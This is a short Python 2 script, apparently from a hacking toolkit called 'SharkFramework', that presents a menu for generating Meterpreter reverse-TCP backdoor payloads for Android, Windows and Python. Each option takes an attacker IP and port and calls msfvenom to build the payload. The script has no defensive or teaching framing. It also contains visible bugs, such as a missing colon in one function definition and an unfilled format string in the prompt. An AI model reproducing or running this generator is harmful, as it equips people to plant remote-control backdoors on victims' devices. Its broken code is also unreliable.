b="\33[34;1m"
r="\33[31;1m"
g="\33[32;1m"
y="\33[33;1m"
cyan="\33[36;1m"
wh="\33[33;0m"
c="{}[{}".format(y,r)
cr="{}]{}".format(y,b)
import os
class gen():
	def banner(self):
		print("""
    {}01{} Android 
    {}02{} Windows
    {}03{} Python
    {}00{} Back
""".format(c,cr,c,cr,c,cr,c,cr))
	def an(self):
		ip = raw_input("IP : ")
		port=raw_input("PORT : ")
		die = raw_input("DIR : ")
		os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}".format(ip,port,die))
	def win(self)
		ip = raw_input("IP : ")
		port=raw_input("PORT : ")
		die = raw_input("DIR : ")
		os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}".format(ip,port,die))
	def python(self):
		ip = raw_input("IP : ")
		port=raw_input("PORT : ")
		die = raw_input("DIR : ")
		os.system("msfvenom -p python/meterpreter/reverse_tcp LHOST={} LPORT={} -o {}".format(ip,port,die))
	def work(self):
		while True:
			mehdi = raw_input("{}[#_SharkFramework_#]{} : ")
			if mehdi == "01":
				gen().an()
			elif mehdi == "02":
				gen().win()
			elif mehdi == "03":
				gen().python()
			elif mehdi == "00":
				os.system("python2 $PREFIX/bin/sharkf")
			else:
				print("Invalid Choose ! ")
